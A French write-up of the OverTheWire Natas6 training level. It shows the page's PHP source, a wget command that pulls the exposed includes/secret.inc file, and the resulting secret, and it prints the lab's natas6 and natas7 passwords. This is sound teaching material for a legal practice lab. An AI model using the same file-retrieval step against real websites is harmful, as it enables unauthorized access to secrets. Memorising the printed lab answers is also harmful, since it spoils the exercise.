## Over-The-Wire -writeup-
### Natas6 (http://natas6.natas.labs.overthewire.org/)

---
#### Etape 1

Un code est demandé, et on a accès à la source de la page index.html et de son box input.  
Dans le code HTML **on trouve une section PHP**:

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Le fichiers "secret.inc" est inclus dans la page HTML, et ensuite PHP compare ce que l'utilisateur entre comme code ($_POST['secret']) et le code secret du serveur (variable $secret, dont la valeur se trouve dans secret.inc)  

On va donc récupérer le fichier secret.inc qui se trouve dans le dossier /includes/ du site.

Pour cela j'utilise **wget** :

Structure de la commande pour récupérer un fichier: `wget http://target-address/file`  
Structure de la commande pour se connecter avec des identifiants: `wget --user [username] --password [password]`

**Fusionnons les deux**:  
`wget --user [username] --password [password] http://target-address/file`

**Enfin, dans notre cas, la commande exacte est**:  
`wget --user natas6 --password aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc`

---
#### Etape 2

Une fois le fichier secret.inc récupéré, cat-ons le:
```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
Le code a rentrer dans le box d'input est donc **FOEIUWGHFEEUHOFUOIU**, qui se comparera à lui-même, sera donc égal à lui-même et satisfiera la condition pour dévoiler la balise "*censored*".

Une fois le code rentré et le bouton "Sumbit Query" cliqué, un texte apparaît:
> Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

---
Mot de passe: **7z3hEENjQtflzgnT29q7wAvMNfZdh0i9**
